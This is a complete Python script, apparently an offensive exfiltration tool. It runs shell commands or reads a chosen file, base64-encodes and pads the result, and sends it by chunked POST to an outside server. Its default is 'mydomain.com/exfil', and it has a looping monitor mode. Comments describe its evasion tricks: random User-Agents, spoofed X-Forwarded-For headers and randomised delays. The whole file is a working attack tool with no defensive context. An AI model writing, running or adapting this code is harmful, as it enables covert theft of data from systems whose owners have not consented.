import argparse
import base64
import subprocess
import requests
import os
import time
import random
from http.client import HTTPConnection
from urllib.parse import urlparse

def get_random_user_agent():
    """Generate a random User-Agent string."""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]
    return random.choice(agents)

def add_random_padding(data):
    """Add random padding to data to vary request size."""
    padding = os.urandom(random.randint(10, 50)).hex()
    return data + padding

def send_chunked_request(url, data, headers):
    """Send a POST request with chunked encoding."""
    parsed_url = urlparse(url)
    conn = HTTPConnection(parsed_url.netloc)
    conn.putrequest("POST", parsed_url.path or "/")
    for key, value in headers.items():
        conn.putheader(key, value)
    conn.putheader("Transfer-Encoding", "chunked")
    conn.endheaders()

    # Send data in chunks
    chunk_size = 1024
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]
        conn.send(f"{len(chunk):x}\r\n{chunk}\r\n".encode())
    conn.send(b"0\r\n\r\n")

    response = conn.getresponse()
    conn.close()
    return response.status == 200

def execute_command(command):
    """Execute a shell command and return its output."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--command', help='Command to execute')
    parser.add_argument('-f', '--file', help='File to exfiltrate')
    parser.add_argument('-s', '--server', default='http://mydomain.com/exfil', help='Server URL')
    parser.add_argument('-m', '--monitor', action='store_true', help='Enable monitor mode for repeated command execution')
    parser.add_argument('-t', '--time', type=float, help='Time interval in minutes for monitor mode')
    args = parser.parse_args()

    # Validate arguments
    if args.monitor and not args.command:
        print("Monitor mode (-m) requires a command (-c)")
        return
    if args.monitor and not args.time:
        print("Monitor mode (-m) requires a time interval (-t)")
        return
    if args.time and args.time <= 0:
        print("Time interval (-t) must be positive")
        return
    if args.file and args.monitor:
        print("File exfiltration (-f) cannot be used with monitor mode (-m)")
        return
    if not (args.command or args.file):
        print("Please provide -c or -f")
        return

    # Common headers with evasion techniques
    base_headers = {
        "User-Agent": get_random_user_agent(),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    if args.monitor:
        # Monitor mode: Repeatedly execute command at specified intervals
        interval_seconds = args.time * 60
        while True:
            try:
                output = execute_command(args.command)
                encoded_data = base64.b64encode(output).decode('utf-8')
                encoded_data = add_random_padding(encoded_data)
                headers = {**base_headers, 'X-Type': 'command'}
                success = send_chunked_request(args.server, encoded_data, headers)
                if not success:
                    print("Failed to send data to server")
                time.sleep(interval_seconds + random.uniform(0, 5))  # Random delay for evasion
            except Exception as e:
                print(f"Error in monitor mode: {e}")
                time.sleep(interval_seconds)  # Continue even if there's an error
    elif args.command:
        # Single command execution
        try:
            output = execute_command(args.command)
            encoded_data = base64.b64encode(output).decode('utf-8')
            encoded_data = add_random_padding(encoded_data)
            headers = {**base_headers, 'X-Type': 'command'}
            success = send_chunked_request(args.server, encoded_data, headers)
            if not success:
                print("Failed to send data to server")
            time.sleep(random.uniform(0.1, 0.5))  # Random delay for evasion
        except Exception as e:
            print(f"Error executing command: {e}")
    elif args.file:
        # File exfiltration
        try:
            with open(args.file, 'rb') as f:
                file_data = f.read()
            encoded_data = base64.b64encode(file_data).decode('utf-8')
            encoded_data = add_random_padding(encoded_data)
            filename = os.path.basename(args.file)
            headers = {**base_headers, 'X-Type': 'file', 'X-Filename': filename}
            success = send_chunked_request(args.server, encoded_data, headers)
            if not success:
                print("Failed to send file to server")
            time.sleep(random.uniform(0.1, 0.5))  # Random delay for evasion
        except Exception as e:
            print(f"Error exfiltrating file: {e}")

if __name__ == '__main__':
    main()
